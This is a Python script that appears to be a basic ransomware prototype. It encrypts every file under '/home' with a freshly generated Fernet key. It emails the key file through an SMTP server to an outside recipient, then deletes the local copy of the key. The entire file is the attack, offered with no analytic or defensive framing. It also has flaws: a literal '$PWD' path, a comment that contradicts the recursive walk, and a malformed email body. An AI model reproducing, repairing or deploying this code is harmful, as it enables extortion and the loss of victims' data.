import os
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email import encoders
from cryptography.fernet import Fernet

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt and save the key to a file
def save_key_to_file(key):
    with open('encrypted_key.enc', 'wb') as file:
        file.write(key)

# Load the encryption key from the file
def load_key_from_file():
    with open('encrypted_key.enc', 'rb') as file:
        return file.read()

# Encrypt a file using the given key
def encrypt_file(file_path, key):
    cipher_suite = Fernet(key)
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    encrypted_text = cipher_suite.encrypt(plaintext)
    with open(file_path + '.enc', 'wb') as file:
        file.write(encrypted_text)

# Replace '/home' with the path of the folder you want to encrypt
folder_to_encrypt = '/home'

# Generate a random encryption key
encryption_key = generate_key()

# Save the encryption key to a file
save_key_to_file(encryption_key)

# Load the encryption key from the file
encryption_key = load_key_from_file()

# Encrypt all files within the folder (excluding subdirectories)
for root, _, files in os.walk(folder_to_encrypt):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path, encryption_key)
##Send the key (However you want it to)
#
def send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, attachment_file):
    # Set up the SMTP server and login
    smtp_server = 'smtp.example.com'
    smtp_port = 587
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
    except smtplib.SMTPAuthenticationError:
        print("Failed to log in. Check your email and password.")
        return
    except Exception as e:
        print(f"Failed to connect to the SMTP server: {e}")
        return

    # Create a message object and set the subject, sender, receiver, and body
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    # Attach the encrypted key file
    with open(attachment_file, 'rb') as file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{attachment_file}"')
        message.attach(part)

    # Add the body of the email
    message.attach(MIMEBase('text', 'plain'))
    message.attach(MIMEBase('text', 'plain').set_payload(body))

    # Send the email and close the server connection
    try:
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

# Example usage:
if __name__ == '__main__':
    sender_email = 'your_email@example.com'
    sender_password = 'your_email_password'
    receiver_email = 'receiver@example.com'
    subject = 'Email with encrypted key attachment'
    body = 'Hello, \n\nPlease find the encrypted key attached.'
    attachment_file = '$PWD/encrypted_key.enc'

    send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, attachment_file)


#Delete the key.

file_path = "$PWD/encrypted_key.enc"

try:
    os.remove(file_path)
    print("File deleted successfully.")
except FileNotFoundError:
    print("File not found.")
except PermissionError:
    print("Permission denied. Make sure you have the necessary permissions.")
except Exception as e:
    print(f"An error occurred: {e}")
